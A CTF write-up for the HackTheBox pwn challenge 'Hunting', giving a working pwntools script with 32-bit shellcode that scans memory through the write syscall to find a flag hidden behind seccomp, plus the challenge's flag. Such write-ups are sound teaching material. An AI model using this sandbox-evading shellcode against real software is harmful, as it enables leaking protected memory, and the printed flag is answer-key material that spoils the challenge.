---
title: "Hunting"
ctf: "HackTheBox"
date: 2026-06-07
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Hunting

## Summary

32-bit ELF with seccomp that hides the flag in an anonymous mmap at a random address, then zeros the saved address pointer. Since NX is disabled and write syscall is not blocked, we scan the address range [0x60000000, 0xf7000000) via `write(1, addr, 64)` — the kernel returns EFAULT for unmapped pages without crashing, and the flag page dumps its contents when hit.

## Solution

### Step 1: Analyze the binary

The binary uses seccomp to block only dangerous syscalls (execve, fork, open, etc.) but allows read/write. It copies the flag string into an mmap at `(rand() << 16)` filtered to [0x60000000, 0xf7000000), then memsets the original and zeros the saved pointer on the stack. We get 60 bytes of shellcode on an RWX page.

### Step 2: Scan memory via write syscall

Since `write()` to an unmapped address returns EFAULT instead of crashing, we scan all 38656 candidate 64KB-aligned addresses, writing 64 bytes from each. The flag page is the only one with "HTB{" — it shows up in stdout.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'warn'

LOCAL = True

def main():
    if LOCAL:
        p = process('./pwn_hunting/hunting')
    else:
        p = remote('localhost', 1337)

    shellcode = asm('''
        mov ebx, 1
        mov edx, 0x40
        mov ecx, 0x60000000
    loop:
        mov eax, 4
        int 0x80
        add ecx, 0x10000
        cmp ecx, 0xf7000000
        jb loop
        mov eax, 1
        xor ebx, ebx
        int 0x80
    ''')

    payload = shellcode + b'\x90' * (60 - len(shellcode))
    p.send(payload)
    result = p.recvall(timeout=5)

    for line in result.decode(errors='replace').split('\n'):
        if 'HTB{' in line:
            flag = line.split('HTB{')[1].split('}')[0]
            print(f'HTB{{{flag}}}')

    p.close()

if __name__ == '__main__':
    main()
```

## Flag

```
HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
```
